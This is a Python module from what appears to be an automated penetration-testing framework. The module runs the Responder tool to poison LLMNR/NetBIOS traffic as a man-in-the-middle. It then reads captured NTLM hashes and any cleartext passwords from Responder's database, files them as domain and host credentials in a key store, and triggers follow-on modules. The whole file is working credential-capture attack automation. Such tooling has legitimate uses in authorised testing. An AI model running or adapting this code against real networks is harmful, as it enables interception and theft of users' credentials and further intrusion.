import datetime
import os

from core.actionModule import actionModule
from core.keystore import KeyStore
from core.utils import Utils


class exploit_responder(actionModule):
    def __init__(self, config, display, lock):
        super(exploit_responder, self).__init__(config, display, lock)
        self.title = "Run Responder and watch for hashes"
        self.shortName = "Responder"
        self.description = "execute [reponder -I eth0 -wrf]"

        self.requirements = ["sqlite3", "responder"]
        self.triggers = ["always"]
        self.types = ["mitm"]

        self.safeLevel = 3

        self.maxThreads = 1

    def process(self):
        default_interface = self.config["responder_iface"]
        default_delay = self.config["responder_delay"]
        my_ip = self.config["lhost"]
        found_hash = False
        self.display.output("Starting responder...")
        temp_file1 = self.config["proofsDir"] + self.shortName + "_" + Utils.getRandStr(10)

        temp_file2 = self.config["proofsDir"] + self.shortName + "_" + Utils.getRandStr(10)

        command = "python " + self.config["responder"] + " -I " + default_interface + " -i " + my_ip + " -wrf"

        start_time = '{:%d-%m-%Y %H:%M:%S}'.format(datetime.datetime.now())
        result = Utils.execWait(command, temp_file1, timeout=int(self.config["responder_timeout"]))

        responder_path, temp1 = os.path.split(self.config["responder"])
        responder_db = f"{responder_path}/Responder.db"
        command = ((((self.config[
                          "sqlite3"] + " ") + responder_db) + """ \"select * from responder where timestamp > '""") + start_time) + """'\""""

        result = Utils.execWait(command, temp_file2, timeout=10)
        times_run = 0 + 1
        if "no such table" not in result:
            for part in result.splitlines():
                found_hash = True
                record = part.split('|')
                if len(record) > 0:
                    method = record[1]
                    hashtype = record[2]
                    print(f"DEBUG-------------------------------{hashtype}")
                    host = record[3]
                    username = record[5]
                    domain = username.split('\\')[0]
                    user = username.split('\\')[1]
                    cleartext = record[6]
                    shorthash = record[7]
                    fullhash = record[8]
                    self.display.error("Vuln [NetBIOS|LLMNR] Found new hash - ", fullhash)
                    self.addVuln(host, "NetBIOS|LLMNR", {"port": "445", "output": temp_file2.replace("/", "%2F")})

                    KeyStore.add(f"creds/domain/{domain}/username/{user}/{hashtype}/{fullhash}")

                    if len(cleartext) > 0:
                        KeyStore.add(f"creds/host/{host}/username/{user}/password/{cleartext}")

        if found_hash:
            self.fire("newNTLMHash")
        return
